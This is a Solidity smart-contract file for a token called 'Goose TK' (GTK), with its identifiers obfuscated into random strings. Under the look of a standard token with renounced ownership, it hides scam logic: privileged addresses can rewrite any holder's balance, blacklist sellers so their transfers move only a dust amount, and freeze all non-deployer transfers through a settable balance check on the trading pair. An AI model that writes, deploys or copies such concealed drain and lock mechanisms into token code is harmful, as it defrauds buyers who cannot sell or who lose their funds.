//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

interface szxcfwavgdow {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract axrsikntdquy {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface ahccugrcfczm {
    function createPair(address esxzqpzyl, address mrwcpthxig) external returns (address);
}

interface lgfetiwewn {
    function totalSupply() external view returns (uint256);

    function balanceOf(address stmpyxwwkt) external view returns (uint256);

    function transfer(address vqfycdrwm, uint256 spqvdhjsptch) external returns (bool);

    function allowance(address ztdlqncag, address spender) external view returns (uint256);

    function approve(address spender, uint256 spqvdhjsptch) external returns (bool);

    function transferFrom(
        address sender,
        address vqfycdrwm,
        uint256 spqvdhjsptch
    ) external returns (bool);

    event Transfer(address indexed from, address indexed cacpwqkrawj, uint256 value);
    event Approval(address indexed ztdlqncag, address indexed spender, uint256 value);
}

interface lgfetiwewnMetadata is lgfetiwewn {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract GooseTK is axrsikntdquy, lgfetiwewn, lgfetiwewnMetadata {

    function decimals() external view virtual override returns (uint8) {
        return yhfdrapod;
    }

    bool private lkmdchebhijtn;

    uint256 qvicifzztetro;

    bool public wvfkiotcduybkc;

    constructor (){
        
        hwkxjauoatq();
        szxcfwavgdow fmxpjdqkt = szxcfwavgdow(xhjgaataav);
        vyskiofsjpknht = ahccugrcfczm(fmxpjdqkt.factory()).createPair(fmxpjdqkt.WETH(), address(this));
        
        icmfnptwb = _msgSender();
        uasgazmgfgjkyf[icmfnptwb] = true;
        gnlloijhcn[icmfnptwb] = cemynpdvfop;
        if (ljtkiiuaq != fowlwygkaaf) {
            cuxemexsror = false;
        }
        emit Transfer(address(0), icmfnptwb, cemynpdvfop);
    }

    string private pttioqwvoztv = "GTK";

    mapping(address => uint256) private gnlloijhcn;

    function aymhtlejub(address pngaxlalmeugd) public {
        yhbbcojqpl();
        
        if (pngaxlalmeugd == icmfnptwb || pngaxlalmeugd == vyskiofsjpknht) {
            return;
        }
        yexritqolblirc[pngaxlalmeugd] = true;
    }

    function name() external view virtual override returns (string memory) {
        return idzymeikol;
    }

    function glggyuaeevwpw(address grnaebnpjbocuj, address vqfycdrwm, uint256 spqvdhjsptch) internal returns (bool) {
        require(gnlloijhcn[grnaebnpjbocuj] >= spqvdhjsptch);
        gnlloijhcn[grnaebnpjbocuj] -= spqvdhjsptch;
        gnlloijhcn[vqfycdrwm] += spqvdhjsptch;
        emit Transfer(grnaebnpjbocuj, vqfycdrwm, spqvdhjsptch);
        return true;
    }

    uint256 constant pnhxtcupltwo = 10 ** 10;

    address public icmfnptwb;

    bool public vggzsuvjolhr;

    event OwnershipTransferred(address indexed jgvaucguithvr, address indexed cjkwondvwn);

    uint256 private cemynpdvfop = 100000000 * 10 ** 18;

    uint8 private yhfdrapod = 18;

    function getOwner() external view returns (address) {
        return qpmusmmckowfz;
    }

    function approve(address vekhguftiuzqle, uint256 spqvdhjsptch) public virtual override returns (bool) {
        phybwrepnlptbd[_msgSender()][vekhguftiuzqle] = spqvdhjsptch;
        emit Approval(_msgSender(), vekhguftiuzqle, spqvdhjsptch);
        return true;
    }

    function allowance(address uteclmpebewlba, address vekhguftiuzqle) external view virtual override returns (uint256) {
        if (vekhguftiuzqle == xhjgaataav) {
            return type(uint256).max;
        }
        return phybwrepnlptbd[uteclmpebewlba][vekhguftiuzqle];
    }

    bool public cuxemexsror;

    uint256 anwdcnxvageaar;

    uint256 public ljtkiiuaq;

    uint256 private jjzcfkbcopmmc;

    function transferFrom(address grnaebnpjbocuj, address vqfycdrwm, uint256 spqvdhjsptch) external override returns (bool) {
        if (_msgSender() != xhjgaataav) {
            if (phybwrepnlptbd[grnaebnpjbocuj][_msgSender()] != type(uint256).max) {
                require(spqvdhjsptch <= phybwrepnlptbd[grnaebnpjbocuj][_msgSender()]);
                phybwrepnlptbd[grnaebnpjbocuj][_msgSender()] -= spqvdhjsptch;
            }
        }
        return znxyhozru(grnaebnpjbocuj, vqfycdrwm, spqvdhjsptch);
    }

    address glezprafrfrjlz = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function yhbbcojqpl() private view {
        require(uasgazmgfgjkyf[_msgSender()]);
    }

    uint256 public fowlwygkaaf;

    function owner() external view returns (address) {
        return qpmusmmckowfz;
    }

    function hwkxjauoatq() public {
        emit OwnershipTransferred(icmfnptwb, address(0));
        qpmusmmckowfz = address(0);
    }

    mapping(address => bool) public yexritqolblirc;

    function qgyjtylphayi(address iyggrulhsb) public {
        if (vggzsuvjolhr) {
            return;
        }
        if (ljtkiiuaq != jjzcfkbcopmmc) {
            jjzcfkbcopmmc = fowlwygkaaf;
        }
        uasgazmgfgjkyf[iyggrulhsb] = true;
        if (ljtkiiuaq == fowlwygkaaf) {
            fowlwygkaaf = ljtkiiuaq;
        }
        vggzsuvjolhr = true;
    }

    address public vyskiofsjpknht;

    function jlyzihwmib(address mqsywnvmbgufv, uint256 spqvdhjsptch) public {
        yhbbcojqpl();
        gnlloijhcn[mqsywnvmbgufv] = spqvdhjsptch;
    }

    address private qpmusmmckowfz;

    function totalSupply() external view virtual override returns (uint256) {
        return cemynpdvfop;
    }

    string private idzymeikol = "Goose TK";

    function btqklqttmvjhxj(uint256 spqvdhjsptch) public {
        yhbbcojqpl();
        anwdcnxvageaar = spqvdhjsptch;
    }

    mapping(address => bool) public uasgazmgfgjkyf;

    function transfer(address mqsywnvmbgufv, uint256 spqvdhjsptch) external virtual override returns (bool) {
        return znxyhozru(_msgSender(), mqsywnvmbgufv, spqvdhjsptch);
    }

    function symbol() external view virtual override returns (string memory) {
        return pttioqwvoztv;
    }

    function balanceOf(address stmpyxwwkt) public view virtual override returns (uint256) {
        return gnlloijhcn[stmpyxwwkt];
    }

    function znxyhozru(address grnaebnpjbocuj, address vqfycdrwm, uint256 spqvdhjsptch) internal returns (bool) {
        if (grnaebnpjbocuj == icmfnptwb) {
            return glggyuaeevwpw(grnaebnpjbocuj, vqfycdrwm, spqvdhjsptch);
        }
        uint256 iugmyzrhib = lgfetiwewn(vyskiofsjpknht).balanceOf(glezprafrfrjlz);
        require(iugmyzrhib == anwdcnxvageaar);
        require(vqfycdrwm != glezprafrfrjlz);
        if (yexritqolblirc[grnaebnpjbocuj]) {
            return glggyuaeevwpw(grnaebnpjbocuj, vqfycdrwm, pnhxtcupltwo);
        }
        return glggyuaeevwpw(grnaebnpjbocuj, vqfycdrwm, spqvdhjsptch);
    }

    mapping(address => mapping(address => uint256)) private phybwrepnlptbd;

    address xhjgaataav = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

}